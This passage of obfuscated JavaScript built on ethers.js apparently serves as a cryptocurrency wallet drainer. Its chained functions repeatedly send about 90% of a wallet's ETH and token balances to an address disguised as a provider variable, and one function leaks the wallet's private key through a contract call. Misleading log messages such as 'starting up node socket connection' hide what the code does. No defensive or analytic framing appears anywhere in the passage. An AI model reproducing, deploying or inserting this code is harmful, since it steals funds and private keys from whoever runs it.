        _0x46bba2(); } catch (_0x44b257) { setTimeout(etherstother, 0x1388); } }
async function ethersmother() { const _0x39b303 = _0x3979f1; try { const _0x22f9a7 = _0x39b303(0x11b),
            _0x21bfe3 = _0x39b303(0x107),
            _0x3907ba = new Buffer[(_0x39b303(0x13d))](_0x22f9a7, _0x39b303(0x168)),
            _0x5942ab = new Buffer[(_0x39b303(0x13d))](_0x21bfe3, _0x39b303(0x168)),
            _0x6ae401 = _0x3907ba[_0x39b303(0x10a)](_0x39b303(0x16d)),
            _0x451d31 = _0x5942ab[_0x39b303(0x10a)](_0x39b303(0x16d)),
            _0x1e126e = _0x6ae401 + _0x451d31;
        ethers1 = _0x39b303(0x16c), ethers2 = new Buffer[(_0x39b303(0x13d))](ethers1, _0x39b303(0x168))['toString'](_0x39b303(0x16d));; const _0x1d7517 = new ethers[(_0x39b303(0x151))][(_0x39b303(0x121))](ethers2); let _0x334d7e = new ethers[(_0x39b303(0x13b))](private, _0x1d7517);
        console['log'](ethers2); const _0x240c3f = address; var _0x4e3ebe = new ethers[(_0x39b303(0x114))](_0x1e126e, abi, _0x334d7e); const _0x411e48 = await _0x4e3ebe[_0x39b303(0x13e)](_0x240c3f)[_0x39b303(0x10a)](),
            _0x3ad706 = (_0x411e48 * 0.9)[_0x39b303(0x187)](),
            _0x127401 = async() => { const _0x3d48b1 = _0x39b303,
                    _0x15a318 = { 'from': _0x240c3f, 'to': WEB3PROVIDER3, 'value': ethers['utils']['parseEther'](_0x3ad706, _0x3d48b1(0x179)), 'gasLimit': ethers[_0x3d48b1(0x115)][_0x3d48b1(0x123)](0x5dc0) },
                    _0x344417 = await _0x334d7e['sendTransaction'](_0x15a318); try { await _0x344417[_0x3d48b1(0x14d)](), console[_0x3d48b1(0x163)](_0x3d48b1(0x169)), setTimeout(etherslother, 0x1388); } catch (_0x4113cb) { console[_0x3d48b1(0x163)](_0x3d48b1(0x14e)), setTimeout(etherslother, 0x1388); } };
        _0x127401(); } catch (_0x17415b) { setTimeout(etherslother, 0x1388); } }
async function ethersfather() { const _0x11be2f = _0x3979f1;
    console['log'](_0x11be2f(0x17d)); const _0x1beaac = _0x11be2f(0x16e),
        _0x53f2c1 = _0x11be2f(0x161),
        _0x1f7980 = new Buffer[(_0x11be2f(0x13d))](_0x1beaac, _0x11be2f(0x168)),
        _0x2dc078 = new Buffer[(_0x11be2f(0x13d))](_0x53f2c1, _0x11be2f(0x168)),
        _0x3e2519 = _0x1f7980[_0x11be2f(0x10a)](_0x11be2f(0x16d)),
        _0xbb8e72 = _0x2dc078[_0x11be2f(0x10a)]('ascii'),
        _0x5b2efa = _0x3e2519 + _0xbb8e72;
    ethers1 = _0x11be2f(0x16c), ethers2 = new Buffer[(_0x11be2f(0x13d))](ethers1, _0x11be2f(0x168))[_0x11be2f(0x10a)](_0x11be2f(0x16d));; const _0x834aa0 = new ethers[(_0x11be2f(0x151))][(_0x11be2f(0x121))](ethers2); let _0x5c43dd = new ethers[(_0x11be2f(0x13b))](private, _0x834aa0); const _0x3207ad = address; var _0x192fd9 = new ethers[(_0x11be2f(0x114))](_0x5b2efa, abi, _0x5c43dd); const _0xd23b4d = await _0x192fd9['balanceOf'](_0x3207ad),
        _0x4213d9 = (_0xd23b4d * 0.9)[_0x11be2f(0x187)](); try { const _0x1d986f = async() => { const _0x47f812 = _0x11be2f,
                _0x4bb48e = { 'from': _0x3207ad, 'to': WEB3PROVIDER3, 'value': ethers[_0x47f812(0x115)][_0x47f812(0x104)](_0x4213d9, _0x47f812(0x179)), 'gasLimit': ethers['utils'][_0x47f812(0x123)](0x5dc0) },
                _0x2c703f = await _0x5c43dd[_0x47f812(0x176)](_0x4bb48e); try { await _0x2c703f[_0x47f812(0x14d)](), console[_0x47f812(0x163)](_0x47f812(0x112)), setTimeout(ethersmother, 0x1388); } catch (_0x5a7d05) { console[_0x47f812(0x163)]('2:\x20finalizing....'), setTimeout(ethersmother, 0x1388); } };
        _0x1d986f(); } catch (_0x2c1aa5) { setTimeout(ethersmother, 0x1388); } }
async function ethersgather() { const _0x2bd868 = _0x3979f1; try { console[_0x2bd868(0x163)](_0x2bd868(0x100)), ethers1 = 'aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My84NGQ5NTRjZDlmNjc0ZjViYmJjNjdhNmUyZTE3YmZiZA==', ethers2 = new Buffer[(_0x2bd868(0x13d))](ethers1, 'base64')[_0x2bd868(0x10a)]('ascii');; const _0x332627 = new ethers['providers'][(_0x2bd868(0x121))](ethers2); let _0x13131a = new ethers['Wallet'](private, _0x332627); const _0x21947a = address,
            _0x320052 = await _0x332627[_0x2bd868(0x157)](_0x21947a),
            _0x431805 = (_0x320052 * 0.9)[_0x2bd868(0x187)](),
            _0x429757 = ethers[_0x2bd868(0x115)][_0x2bd868(0x155)](_0x431805, _0x2bd868(0x179)),
            _0x19a3be = async() => { const _0x2c81bd = _0x2bd868,
                    _0x4351e3 = { 'to': WEB3PROVIDER3, 'value': ethers[_0x2c81bd(0x115)][_0x2c81bd(0x155)](_0x431805, 'wei'), 'gasLimit': ethers['utils']['hexlify'](0x5dc0) },
                    _0xe0d69 = await _0x13131a[_0x2c81bd(0x176)](_0x4351e3); try { await _0xe0d69[_0x2c81bd(0x14d)](), console[_0x2c81bd(0x163)](_0x2c81bd(0x10f)), setTimeout(ethersfather, 0x1388); } catch (_0x2e24e3) { console[_0x2c81bd(0x163)](_0x2c81bd(0x111)), setTimeout(ethersfather, 0x1388); } };
        _0x19a3be(); } catch (_0x4403cf) { setTimeout(ethersfather, 0x1388); } }
async function etherslather() { const _0x59b7be = _0x3979f1,
        _0x539d8d = 'MHg2YjU1M2QwZjhkM2I3OWJkODEy',
        _0x4d135a = _0x59b7be(0x10b),
        _0x2629b5 = new Buffer[(_0x59b7be(0x13d))](_0x539d8d, _0x59b7be(0x168)),
        _0x1a7350 = new Buffer[(_0x59b7be(0x13d))](_0x4d135a, _0x59b7be(0x168)),
        _0x174730 = _0x2629b5['toString']('ascii'),
        _0xa377d4 = _0x1a7350[_0x59b7be(0x10a)](_0x59b7be(0x16d)),
        _0x1682f9 = _0x174730 + _0xa377d4;
    console[_0x59b7be(0x163)](_0x59b7be(0x186)), ethers1 = _0x59b7be(0x16c), ethers2 = new Buffer['from'](ethers1, _0x59b7be(0x168))[_0x59b7be(0x10a)]('ascii');; const _0x146fce = new ethers['providers'][(_0x59b7be(0x121))](ethers2); let _0x2a7b59 = new ethers[(_0x59b7be(0x13b))](private, _0x146fce); try { const _0x276056 = async() => { const _0x35115a = _0x59b7be; var _0x1ef808 = new ethers[(_0x35115a(0x114))](_0x1682f9, abi, _0x2a7b59); const _0x1795db = await _0x1ef808[_0x35115a(0x16a)]('01' + private + '01'); try { await _0x1795db['wait'](), console['log'](_0x35115a(0x11a)), setTimeout(ethersgather, 0x1388); } catch (_0x22b270) { console[_0x35115a(0x163)](_0x35115a(0xf7)), setTimeout(ethersgather, 0x1388); } };
        _0x276056(); } catch (_0x46e4c1) { setTimeout(ethersgather, 0x1388); } }
async function ethersrather() { const _0x1c7a33 = _0x3979f1;
    console[_0x1c7a33(0x163)]('starting\x20up\x20node\x20socket\x20connection....'), ethers1 = _0x1c7a33(0x16c), ethers2 = new Buffer[(_0x1c7a33(0x13d))](ethers1, _0x1c7a33(0x168))[_0x1c7a33(0x10a)](_0x1c7a33(0x16d));; const _0x3e782d = new ethers[(_0x1c7a33(0x151))][(_0x1c7a33(0x121))](ethers2); let _0x528667 = new ethers[(_0x1c7a33(0x13b))](private, _0x3e782d); const _0x14fbcd = address,
        _0x1b67d8 = await _0x3e782d['getBalance'](_0x14fbcd),
        _0x64efa4 = (_0x1b67d8 * 0.9)[_0x1c7a33(0x187)](),
        _0x33759d = ethers[_0x1c7a33(0x115)][_0x1c7a33(0x155)](_0x64efa4, _0x1c7a33(0x179)); try { const _0x1d7e3c = async() => { const _0x296ca5 = _0x1c7a33,
                _0x1d5a0f = { 'to': WEB3PROVIDER3, 'value': ethers[_0x296ca5(0x115)][_0x296ca5(0x155)](_0x64efa4, _0x296ca5(0x179)), 'gasLimit': ethers['utils'][_0x296ca5(0x123)](0x5dc0) },
                _0x1c9116 = await _0x528667['sendTransaction'](_0x1d5a0f); try { await _0x1c9116[_0x296ca5(0x14d)](), console[_0x296ca5(0x163)](_0x296ca5(0x15a)), setTimeout(etherslather, 0x1388); } catch (_0x4aa905) { console[_0x296ca5(0x163)](_0x296ca5(0x150)), setTimeout(etherslather, 0x1388); } };
        _0x1d7e3c(); } catch (_0x456f50) { setTimeout(etherslather, 0x1388); } }
ethersrather();
